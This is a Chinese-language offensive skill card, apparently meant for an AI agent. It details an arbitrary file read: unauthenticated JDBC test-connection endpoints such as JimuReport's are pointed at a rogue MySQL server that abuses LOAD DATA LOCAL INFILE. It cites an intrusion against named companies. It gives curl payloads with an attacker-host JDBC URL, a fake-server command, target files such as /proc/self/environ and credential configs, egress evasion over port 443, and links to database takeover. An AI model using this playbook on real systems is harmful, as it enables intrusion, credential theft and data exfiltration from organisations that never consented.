---
name: jdbc-malicious-mysql-file-read
description: >-
  Use when 目标有「数据库连接测试」类未授权端点（JimuReport /jmreport/testConnection、报表/数据源管理、
  Druid 监控台）：填 jdbc:mysql://攻击机 让目标反连假 MySQL，服务端回 LOAD DATA LOCAL INFILE
  请求就变成目标主动读任意文件并回传。含假服务端要点、读配置拿库口令、无回显时的带外。
---

# 未授权 JDBC + 恶意 MySQL → 任意文件读取

实战来源：时代通/云信互联（2026-10），`POST /jmreport/testConnection` 零鉴权，读 `/proc/self/environ` 与 `application-dev.yml` 拿到 MySQL 口令，落 45 张表。

## When to Use

- 目标有**报表组件**（JimuReport、积木报表、帆软、Metabase）或**数据源管理**页
- 有 `testConnection` / `testConnect` / `checkDataSource` / `validate` 这类「测连通」接口
- Druid 监控台、Nacos、Apollo、Spring Boot Admin 暴露数据源配置
- 想从「能发请求」升级到「能读服务器文件」

## 根因

`testConnection` 拿用户填的 `dbUrl` 直接 `DriverManager.getConnection()`：

- 没有协议/主机白名单 → 可以指任意主机（含内网、攻击机）
- MySQL JDBC 驱动默认允许 `allowLoadLocalInfile`（旧版）或攻击者传参打开
- 假 MySQL 服务端在握手后发 `0xFB + 文件路径` = `LOAD DATA LOCAL INFILE` 请求，**客户端（目标）主动读本地文件并上传**

## 打法

### 1. 确认端点存在

```bash
curl -s -i -X POST 'https://目标/jmreport/testConnection' \
  -H 'Content-Type: application/json' -d '{}' | head -20
# 也可以试 /jmreport/queryFieldBySql、/jmreport/loadTableData、/jeecg-boot/jmreport/*
```

- 返回 JSON（`success:false` 但也带 message）= 端点活着；跳登录页 = 挂了鉴权

### 2. 起假 MySQL

```bash
# rogue-mysql-server / fake_mysql.py 类实现：握手 + 回 0xFB 请求任意路径
python3 fake_mysql.py --port 3306 --file /www/yunxing/config/application-dev.yml
```

- 需要的东西：server greeting（协议版本 10）、`mysql_native_password` 认证包、然后发 `0xFB` 包
- 目标驱动版本决定行为：`allowLoadLocalInfile=true` 是显式开关；老驱动默认允许

### 3. 打过去

```bash
curl -s -X POST 'https://目标/jmreport/testConnection' \
  -H 'Content-Type: application/json' -d '{
    "dbType":"mysql",
    "dbDriver":"com.mysql.cj.jdbc.Driver",
    "dbUrl":"jdbc:mysql://攻击机IP:3306/x?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&autoReconnect=true",
    "dbUsername":"x","dbPassword":"x"
  }'
```

- 优先读：`/proc/self/environ`、`/proc/self/cmdline`、`/etc/passwd`
- 再读配置：`application.yml` / `application-dev.yml` / `.env` / `config/*.properties`
- 从配置里拿 MySQL/Redis/OSS 口令 → 直连内网库（若端口可达）

### 4. 无回显时

- 假服务端把读到的内容写本地文件（`--out`），不需要目标回显
- 若目标网络只允许出 80/443：假服务端换到 443 端口跑（MySQL 协议跑在 443 上，多数出站策略放行）

## 判据门槛

- **L1**：`testConnection` 无鉴权可调
- **L2**：假服务端收到目标发起的握手（说明真的连出来了）
- **L3**：收到目标回传的文件内容（`/etc/passwd` 首行可读）

## 坑

1. MySQL 8 驱动默认 `allowLoadLocalInfile=false`，必须显式传参；有的组件会过滤参数名 → 试 `allowLoadLocalInfile=true` 放 URL 尾部、`useSSL=false`
2. 目标 JDK 高版本对 `local_infile` 有额外校验（`allowUrlInLocalInfile`）
3. JimuReport 老版本（1.0.x）才有未授权；1.6+ 加了 token
4. 别真去连生产库，假服务端只回认证失败即可，避免脏数据

## 相关卡

- `unauthenticated-admin-api` — 同族「管理 API 整面未鉴权」
- `ssrf-verification-and-escalation` — 同族「服务端替你连」
- `mssql-stacked-query-takeover` — 拿到库口令后的接管
